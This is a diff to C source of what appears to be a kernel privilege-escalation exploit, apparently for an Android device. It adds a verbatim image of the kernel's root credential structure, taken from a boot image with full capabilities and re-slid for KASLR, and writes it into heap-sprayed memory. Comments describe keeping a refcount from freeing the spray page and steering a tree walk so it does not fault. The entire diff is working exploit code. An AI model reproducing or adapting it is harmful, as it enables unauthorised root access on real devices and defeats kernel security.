@@ -594,16 +594,48 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
   memcpy(p + off, &value, sizeof(value));
 }
 
+/* Image-verbatim init_cred (RVA 0x27E0BE0, dumped from boot.img; the
+ * three .data pointers are LINK-time VAs — apply kaslr_slide at fill).
+ * uid/euid/..=0, caps FULL at +0x30/38/40, +0x80=&root_user,
+ * +0x88=&init_user_ns, +0x90=&init_groups (verified vs kallsyms). */
+static const uint64_t k_init_cred_image[22] = {
+    0x0000000000000004ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x000001ffffffffffULL,
+    0x000001ffffffffffULL,
+    0x000001ffffffffffULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0xffffffc00a7df760ULL,
+    0xffffffc00a7df7f8ULL,
+    0xffffffc00a7e0c88ULL,
+    0x0000000000000000ULL,
+    0x0000000000000000ULL,
+    0x0000000000000002ULL,
+};
+
 static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
-  memset(c, 0, 136);
-  /* Huge usage so put_cred will not free the spray page. uid/euid stay 0. */
-  put32(c, 0, 0x40000000);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  memset(c, 0, 176);
+  for (int i = 0; i < 22; i++) {
+    uint64_t v = k_init_cred_image[i];
+    if (v >= 0xffffffc000000000ULL) /* link-time kernel VA: re-slide */
+      v += kaslr_slide;
+    put64(c, (size_t)i * 8, v);
+  }
+  /* usage(=+0): a huge refcount AND a pointer to a ZEROED sprayed slot
+   * (page+0x1600) so the pi-erase's NULL-sibling up-walk terminates
+   * (cc -> zeroslot -> NULL) instead of faulting on 0x40000000. */
+  put64(c, 0, (uintptr_t)(p + 0x1600));
 }
 
 /* Resolve symbol image VA from runtime offsets table when available.
